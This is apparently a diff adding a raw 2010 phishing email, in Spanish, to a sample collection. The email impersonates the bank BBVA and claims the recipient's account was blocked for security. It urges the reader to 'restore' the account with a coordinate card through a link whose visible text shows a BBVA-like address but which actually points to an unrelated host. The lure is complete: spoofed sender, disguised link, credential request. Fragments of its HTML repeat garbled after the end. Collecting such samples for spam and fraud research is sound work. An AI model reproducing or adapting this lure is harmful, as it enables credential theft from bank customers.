@@ -1,0 +1,120 @@
+X-Account-Key: account2
+Return-path: <root@ns1.geetel.net>
+Envelope-to: ftp@uvigo.es
+Delivery-date: Wed, 16 Jun 2010 08:32:44 +0200
+Received: from dns.uvigo.es ([193.146.32.86] helo=acelga.uvigo.es)
+	by cacahuete.uvigo.es with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
+	(Exim 4.69)
+	(envelope-from <root@ns1.geetel.net>)
+	id 1OOmB2-0006uF-3h
+	for ftp@uvigo.es; Wed, 16 Jun 2010 08:32:44 +0200
+Received: from niscalo.uvigo.es (antispam2.uvigo.es [193.146.32.78])
+	by acelga.uvigo.es (8.13.8/8.13.8/Debian-3) with ESMTP id o5G6Wd2a027740
+	(version=TLSv1/SSLv3 cipher=AES256-SHA bits=256 verify=NOT)
+	for <ftp@uvigo.es>; Wed, 16 Jun 2010 08:32:43 +0200
+Received: from ns1.geetel.net ([216.21.176.10])
+	by niscalo.uvigo.es with esmtp (Exim 4.69)
+	(envelope-from <root@ns1.geetel.net>)
+	id 1OOlwV-00041h-LX
+	for ftp@uvigo.es; Wed, 16 Jun 2010 08:17:44 +0200
+Received: from ns1.geetel.net (localhost [127.0.0.1])
+	by ns1.geetel.net (8.12.10/8.12.10) with ESMTP id o5G6WaPd000445
+	for <ftp@uvigo.es>; Wed, 16 Jun 2010 02:32:36 -0400
+Received: (from root@localhost)
+	by ns1.geetel.net (8.12.10/8.12.8/Submit) id o5G6WaIw000443;
+	Wed, 16 Jun 2010 02:32:36 -0400
+Date: Wed, 16 Jun 2010 02:32:36 -0400
+Message-Id: <201006160632.o5G6WaIw000443@ns1.geetel.net>
+To: ftp@uvigo.es
+From: BBVA@bbva.es
+Content-Type: text/html
+X-Spam-Flag: No
+X-Spam-Checker-Version: SpamAssassin 3.2.5 (2008-06-10) on niscalo.uvigo.es
+X-Spam-Status: No, score=3.8 required=5.0 tests=BAYES_50,HTML_FONT_SIZE_LARGE,
+	HTML_IMAGE_ONLY_32,HTML_MESSAGE,MIME_HEADER_CTYPE_ONLY,MIME_HTML_ONLY
+	autolearn=no version=3.2.5
+X-Spam-UVIGO-Status: No, score=3.8 required=5.0 tests=BAYES_50=0.001,
+	HTML_FONT_SIZE_LARGE=0.001,HTML_IMAGE_ONLY_32=1.778,HTML_MESSAGE=0.001,
+	MIME_HEADER_CTYPE_ONLY=0.56,MIME_HTML_ONLY=1.457 autolearn=no version=3.2.5
+X-Spam-UVIGO-Level: ***
+X-Spam-UVIGO: No
+X-Spam-UVIGO-Score: _SCOREINT_
+Subject: acceso no autorizado a su cuenta de BBVA
+X-Mail-Scanned: Criba + Clamd smtp.uvigo.es
+X-SA-Exim-Connect-IP: 193.146.32.86
+X-SA-Exim-Mail-From: root@ns1.geetel.net
+X-SA-Exim-Scanned: No (on cacahuete.uvigo.es); SAEximRunCond expanded to false
+
+
+<html>
+
+<head>
+<title>                                                                                        </title>
+<meta name="generator" content="Namo WebEditor(Trial)">
+</head>
+
+<body bgcolor="white" text="black" link="blue" vlink="purple" alink="red">
+<p><img src="http://formacion.publibox.es/pc.gif" width="114" height="34" border="0"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
+<p><font size="5" color="#CC00CC">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#000000">&nbsp;</font></font><font color="#000000"><B><font size="6">Estimado Cliente de BBVA</font></B><font size="6">.</font></font></p>
+<p><font face="Times New Roman, Times, serif">En BBVA sabemos que sólo a través de la constante mejora de 
+nuestros productos y servicios </font></p>
+<P><font face="Times New Roman, Times, serif">podremos estar preparados para ofrecer soluciones 
+a las necesidades financieras de nuestros clientes</font></P>
+<p><font face="Times New Roman, Times, serif">Como medida de seguridad nuestro sistema ha bloqueado su cuenta 
+temporalmente.<BR>Para desbloquear su cuenta, usted debe ingresar a su cuenta 
+desde<BR>su ip y confirmar su identidad con su tarjeta de coordenadas.</font></p>
+<p><B>Entrar ahora en la <A href="http://formacion.publibox.es/bbva.html" 
+target=_blank>oficina de BBVA</a> para restaurar su cuenta :</B></p>
+<p>&nbsp;</p>
+<p><font size="5" color="red"><a href="http://formacion.publibox.es/bbva.html">http://www.seguridad-bbva.es/TLBS/tlbs/jsp/esp/home/</a></font></p>
+<P><B><font color="#000000">AVISO DE SEGURIDAD :</font></B></P>
+<P><font color="#666666">Si recibe un correo en el que le piden sus datos de BBVA , NO 
+FACILITE SUS CLAVES.<BR>
+BBVA nunca envía mensajes solicitando esta 
+información.</font></P>
+<P><font color="#666666">En BBVA trabajamos constantemente para garantizar la confidencialidad de las 
+comunicaciones entre el Banco y el cliente 
+  <!--$$-->
+.</font></P>
+<UL>
+    <LI><font color="#666666">
+    <!--$$-->
+    Que el cliente está comunicando sus datos al centro servidor de 
+BBVA y no a cualquier otro que intentara hacerse pasar por éste
+<!--$$-->
+.  </font></LI>
+    <LI><font color="#666666">
+    <!--$$-->
+    Que entre el cliente y el centro servidor de BBVA los datos viajan 
+cifrados, evitando su posible lectura o manipulación por terceros
+<!--$$-->
+. 
+<BR>
+  </font></LI>
+</UL>
+<P><font color="#666666"><B>¡Recuerde! BBVA nunca le pedirá su identificación personal.</B></font><B></B></P>
+<P><BR><STRONG>Comisionado para la Defensa del Cliente de Servicios 
+Bancarios</STRONG><BR>Servicio de Reclamaciones <BR>Alcalá 48, 28014 Madrid</P>
+</body>
+
+</html>
+
+
+/UL>
+<P><font color="#666666"><B>¡Recuerde! BBVA nunca le pedirá su identificación personal.</B></font><B></B></P>
+<P><BR><STRONG>Comisionado para la Defensa del Cliente de Servicios 
+Bancarios</STRONG><BR>Servicio de Reclamaciones <BR>Alcalá 48, 28014 Madrid</P>
+</body>
+
+</html>
+
+
+8, 28014 Madrid</P>
+</body>
+
+</html>
+
+
+</html>
+
+
